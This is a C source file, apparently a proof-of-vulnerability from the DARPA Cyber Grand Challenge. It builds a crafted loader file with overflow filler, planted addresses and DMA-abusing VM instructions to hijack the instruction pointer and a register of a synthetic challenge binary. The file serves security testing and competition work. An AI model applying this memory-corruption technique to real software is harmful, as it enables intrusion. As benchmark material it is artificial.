/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>

int IsHexChar( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (1);
	else if ( val >= 'A' && val <= 'F' )
		return (1);
	else if ( val >= '0' && val <= '9' )
		return (1);
	else
		return (0);
}

uint8_t HexCharToInt( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (10 + (val-'a'));
	else if ( val >= 'A' && val <= 'F' )
		return (10 + (val-'A'));
	else if ( val >= '0' && val <= '9' )
		return (0 + (val-'0'));
	else
		return (0);
}

size_t ReadBytes( int fd, char *buf, size_t len ) 
{
	size_t total_bytes = 0;
	size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

size_t RecvUntil(int fd, char delim, char *buf, size_t maxlen) 
{
	size_t total_bytes = 0;
	size_t rx_bytes = 0;
	char c;

	while ( total_bytes < maxlen-1 )
	{
		if ( receive( fd, &c, 1, &rx_bytes ) != 0 )
			return (0);

		if ( rx_bytes == 0 )
			return (0);

		if ( c == delim )
			break;

		buf[total_bytes++] = c;
	}

	buf[total_bytes] = '\0';

	return (total_bytes);
}

size_t SendBytes(int fd, char *buf, size_t len) 
{
	size_t tx_bytes;
	size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) 
{
	unsigned int PovType = 2;
	
	// Request Type 2 negotitation
	if (SendBytes(3, (char *)&PovType, 4) != 4)
		_terminate(-1);

	// get the 4-byte value for type2_addr
	if (ReadBytes(3, (char *)type2_addr, 4) != 4)
		_terminate(-1);

	// get the 4-byte size for type_size
	if (ReadBytes(3, (char *)type2_size, 4) != 4)
		_terminate(-1);
			
	// get the 4-byte value for type2_length
	if (ReadBytes(3, (char *)type2_length, 4) != 4)
		_terminate(-1);

}

void SendLine( int fd, const char *pszLine )
{
	size_t line_len = strlen( pszLine );

	SendBytes( fd, (char *)pszLine, line_len );
}	

void SendCommand( const char *pszCommandData )
{
	size_t command_len = strlen( pszCommandData );

	SendBytes( 1, (char *)pszCommandData, command_len );
}

void NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) 
{
        unsigned int PovType = 1;

	// Request Type 1 negotitation
	if ( SendBytes(3, (char *)&PovType, 4) != 4 )
		_terminate(-1);
	
	 // Send the ipmask
	 if ( SendBytes(3, (char *)&ipmask, 4) != 4 )
		 _terminate(-1);

	 // Send the regmask
	 if ( SendBytes(3, (char *)&regmask, 4) != 4)
		 _terminate(-1);
	 
	 // Send the register number we'll be controlling
	if ( SendBytes(3, (char *)&regnum, 4) != 4 )
		_terminate(-1);

	// get the 4-byte value for eip
	if ( ReadBytes(3, (char *)type1_ip, 4) != 4)
		_terminate(-1);
 
	// get the 4-byte value for the register
	if (ReadBytes(3, (char *)type1_reg, 4) != 4)
		_terminate(-1);
 
	return;
}

void ConsumeLines( size_t lineCount )
{
	char szMaxLineLen[2048];

	// Limitation -- only 2048 bytes until line is read!
	for ( size_t count = 0; count < lineCount; count++ )
		RecvUntil( 0, '\n', szMaxLineLen, 2048 );
}

#define FILE_HEADER_SIZE	12
enum
{
	SECTION_TYPE_EXECUTE = 0,
	SECTION_TYPE_DATA = 1,
	SECTION_TYPE_COMMENT = 2
} eSectionType;

typedef struct CLF_FILE_HEADER
{
	uint32_t magic;
	uint32_t fileSize;
	uint16_t section_count;
	uint16_t entry_address;
} __attribute__((packed)) tCLFFileHeader;

// Section file header
typedef struct SECTION_FILE_HEADER
{
	uint8_t sectionType;
	uint16_t sectionSize;
	uint16_t sectionAddress;
	uint32_t fileOffset;
} __attribute__((packed))  tSectionFileHeader;

// Section headers define loadable sections, such as execute, data, and comment
typedef struct SECTION_DATA
{
	uint8_t sectionType;
	uint16_t sectionSize;
	uint16_t sectionAddress;
	uint8_t *pSectionData;
} tSectionData;

#define EAX_REG_NUM	(0)
#define ECX_REG_NUM	(1)
#define EDX_REG_NUM	(2)
#define EBX_REG_NUM	(3)
#define ESP_REG_NUM	(4)
#define EBP_REG_NUM	(5)
#define ESI_REG_NUM	(6)
#define EDI_REG_NUM	(7)
int main(void) 
{
	// ipmask -- mask of CB/RB instruction pointer
	// regmask -- mask of CB/RB register (specified by third argument)
	// 0 - eax, 1 - ecx, 2 - edx, 3 - ebx, 4 - esp, 5 - ebp, 6 - esi, 7 - edi
   
	char szReadBuf[256];

	unsigned int type1_ip;
	unsigned int type1_reg;
	NegotiateType1Pov( 0xfefefefe, 0xfefefefe, EAX_REG_NUM, &type1_ip, &type1_reg );

	// Build struct for loader file
	tCLFFileHeader oFileHeader;
	tSectionFileHeader oSectionHeader;

	oFileHeader.magic = 0xc3585c51;	
	oFileHeader.fileSize = sizeof(oFileHeader)+sizeof(oSectionHeader)+512;
	oFileHeader.section_count = 1;
	oFileHeader.entry_address = 0xC000;


	oSectionHeader.sectionType = 0;
	oSectionHeader.sectionSize = 512;
	oSectionHeader.sectionAddress = 0xC000;	
	oSectionHeader.fileOffset = sizeof(oFileHeader)+sizeof(oSectionHeader);

	// Section Data is next (instructions for the VM to execute)
	uint8_t instrData[512];
	uint16_t *pInstr = (uint16_t*)&instrData[0];

	for ( uint32_t i = 0; i < 512; i++ )
		instrData[i] = 'A';

	*((uint32_t*)(instrData+0x20)) = 0xb7fff464;
	*((uint32_t*)(instrData+0x30)) = 0x080481a4;
	*((uint32_t*)(instrData+0x24)) = 0x080481a6;
	*((uint32_t*)(instrData+0x28)) = type1_reg;
	*((uint32_t*)(instrData+0x2c)) = type1_ip;

	uint16_t regFrom = 0x0;
	uint16_t regLen = 0x1;

	uint16_t dma_device_id = 1; // DMA device for writing
	*(pInstr++) = (0x0 << 12) | (0 << 8) | (0xC0);	// LoadImmediateHI 0, 0xC0
	*(pInstr++) = (0x1 << 12) | (0 << 8) | (0x00);	// LoadImmediateLO 0, 0x00
	*(pInstr++) = (0x0 << 12) | (1 << 8) | (0x00);	// LoadImmediateHI 1, 0x00
	*(pInstr++) = (0x1 << 12) | (1 << 8) | (0xF0);	// LoadImmediateLO 1, 0xF0
	*(pInstr++) = (0x3 << 13) | (4 << 8) | (dma_device_id);
	for ( uint32_t t = 0; t < 5; t++ )
	{	
	*(pInstr++) = (0x3 << 13) | (6 << 8) | (regFrom << 4) | regLen;
	}
	*(pInstr++) = (0x0 << 12) | (0 << 8) | (0xf4);	// LoadImmediateHI 0, 0xC0
	*(pInstr++) = (0x1 << 12) | (0 << 8) | (0x64);	// LoadImmediateLO 0, 0x00
	*(pInstr++) = (0x0 << 12) | (1 << 8) | (0xb7);	// LoadImmediateHI 1, 0x00
	*(pInstr++) = (0x1 << 12) | (1 << 8) | (0xff);	// LoadImmediateLO 1, 0xF0
	*(pInstr++) = (0x3 << 13) | (6 << 8) | (regFrom << 4) | regLen;

	// Send data
	// [FILE LENGTH - 32-bits][FILE DATA]
	uint32_t clfFileLength = sizeof(oFileHeader) + sizeof(oSectionHeader) + 512;
	SendBytes( STDOUT, (char *)&clfFileLength, 4 );
	SendBytes( STDOUT, (char *)&oFileHeader, sizeof(oFileHeader) );
	SendBytes( STDOUT, (char *)&oSectionHeader, sizeof(oSectionHeader) );
	SendBytes( STDOUT, (char *)instrData, 512 );

	for ( uint32_t instrCount = 0; instrCount < 256; instrCount++ )
	{
		ConsumeLines( 6 );
	}

	ConsumeLines( 100 );

	return (0);
}
